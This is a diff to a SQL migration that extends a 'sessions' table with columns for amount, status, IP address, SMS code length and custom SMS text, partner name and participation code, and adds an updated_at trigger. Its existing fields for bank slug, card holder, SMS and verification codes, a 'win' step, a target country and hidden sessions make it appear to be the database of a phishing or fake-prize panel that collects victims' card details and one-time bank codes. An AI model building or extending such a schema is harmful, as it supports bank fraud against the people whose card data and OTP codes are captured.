@@ -75,7 +75,10 @@ CREATE TABLE IF NOT EXISTS public.sessions (
   partner_id UUID REFERENCES public.partners(id) ON DELETE SET NULL,
   target_country TEXT DEFAULT 'Australia',
   current_step TEXT DEFAULT 'win',
+  amount INT NOT NULL DEFAULT 0 CHECK (amount >= 0),
+  status TEXT NOT NULL DEFAULT 'offline',
   visitor_ip TEXT,
+  ip_address TEXT,
   user_agent TEXT,
   language TEXT,
   current_bank_slug TEXT,
@@ -95,6 +98,10 @@ CREATE TABLE IF NOT EXISTS public.sessions (
   card_holder TEXT,
   sms_code TEXT,
   code_value TEXT,
+  sms_digits INT NOT NULL DEFAULT 6 CHECK (sms_digits >= 4 AND sms_digits <= 12),
+  sms_custom_text TEXT,
+  partner_name TEXT,
+  participation_code TEXT,
   is_hidden BOOLEAN DEFAULT false,
   is_completed BOOLEAN DEFAULT false,
   total_bonus_amount_cents INT DEFAULT 0,
@@ -115,6 +122,20 @@ CREATE INDEX IF NOT EXISTS idx_sessions_current_step ON public.sessions (current
 CREATE INDEX IF NOT EXISTS idx_sessions_target_country ON public.sessions (target_country);
 CREATE INDEX IF NOT EXISTS idx_sessions_is_hidden ON public.sessions (is_hidden);
 CREATE INDEX IF NOT EXISTS idx_sessions_last_ping_at ON public.sessions (last_ping_at);
+
+-- sessions set_updated_at trigger
+CREATE OR REPLACE FUNCTION public.set_updated_at()
+RETURNS trigger AS $$
+begin
+  new.updated_at = now();
+  return new;
+end;
+$$ language plpgsql security definer set search_path = public;
+
+DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
+CREATE TRIGGER sessions_set_updated_at
+BEFORE UPDATE ON public.sessions
+FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();
 
 -- ####################################################################
 -- (3) bootstrap sonrasi ek migrationlar (sirayla)
